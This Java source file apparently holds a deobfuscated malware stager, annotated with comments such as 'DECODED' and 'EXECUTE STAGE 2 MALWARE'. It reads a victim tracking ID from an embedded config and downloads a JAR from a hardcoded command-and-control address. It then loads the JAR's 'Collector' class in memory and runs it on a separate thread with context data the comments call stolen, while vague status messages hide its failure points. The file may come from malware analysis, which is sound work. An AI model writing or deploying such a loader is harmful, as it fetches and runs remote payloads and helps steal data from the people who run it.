package com.example;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class StagingHelper {

    public static void stageWithContext(JsonObject context) {
        String userId;

        // Read tracking UUID from embedded config file
        try (InputStreamReader reader = new InputStreamReader(
                Objects.requireNonNull(StagingHelper.class.getClassLoader()
                        .getResourceAsStream("cfg.json")))) {
            JsonObject json = new Gson().fromJson(reader, JsonObject.class);
            userId = json.get("uuid").getAsString();
        } catch (Exception e) {
            System.out.println("Resource state: S0");
            return;
        }

        String c2Url = "http://10.10.8.171:7575/1.jar";

        // Add tracking ID to stolen data
        context.addProperty("userId", userId);

        try {
            // download payload from server
            byte[] jarBytes = downloadJar(c2Url);
            if (jarBytes == null) {
                System.out.println("Resource state: S1");
                return;
            }

            // Parse downloaded JAR file
            HashMap<String, byte[]> classMap = new HashMap<>();
            HashMap<String, byte[]> resourceMap = new HashMap<>();

            try (JarInputStream jarStream = new JarInputStream(new ByteArrayInputStream(jarBytes))) {
                JarEntry entry;
                while ((entry = jarStream.getNextJarEntry()) != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    jarStream.transferTo(baos);
                    byte[] data = baos.toByteArray();

                    if (entry.getName().endsWith(".class")) {
                        // Extract class files
                        String className = entry.getName()
                                .replace('/', '.')
                                .replace(".class", "");
                        classMap.put(className, data);
                    } else {
                        // Extract resources
                        resourceMap.put(entry.getName(), data);
                    }
                }
            } catch (Exception e) {
                System.out.println("Resource state: S2");
                return;
            }

            if (classMap.isEmpty()) {
                System.out.println("Resource state: S3");
                return;
            }

            // Create custom ClassLoader with downloaded classes
            IMCL loader = new IMCL(classMap, resourceMap);

            // DECODED: Load malicious class named "Collector"
            Class<?> maliciousClass;
            try {
                maliciousClass = loader.loadClass("Collector");
            } catch (ClassNotFoundException e) {
                System.out.println("Resource state: S4");
                return;
            }

            // Instantiate the malicious class
            Object malwareInstance;
            try {
                malwareInstance = maliciousClass.getDeclaredConstructor().newInstance();
            } catch (Exception e) {
                System.out.println("Resource state: S5");
                return;
            }

            // EXECUTE STAGE 2 MALWARE
            // DECODED: Call method named "runClient"
            new Thread(() -> {
                try {
                    maliciousClass.getMethod("runClient", String.class)
                            .invoke(malwareInstance, new Gson().toJson(context));
                } catch (Exception e) {
                    System.out.println("Resource state: S6");
                }
            }).start();

        } catch (Exception e) {
            System.out.println("Resource state: S7");
        }
    }

    private static byte[] downloadJar(String url) {
        try (HttpClient client = HttpClient.newHttpClient()) {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .GET()
                    .build();

            try {
                HttpResponse<byte[]> response = client.send(
                        request,
                        HttpResponse.BodyHandlers.ofByteArray()
                );

                if (response.statusCode() == 200) {
                    return response.body();
                } else {
                    System.out.println("Resource state: D");
                    return null;
                }
            } catch (Exception e) {
                System.out.println("Resource state: D0");
                return null;
            }
        }
    }
}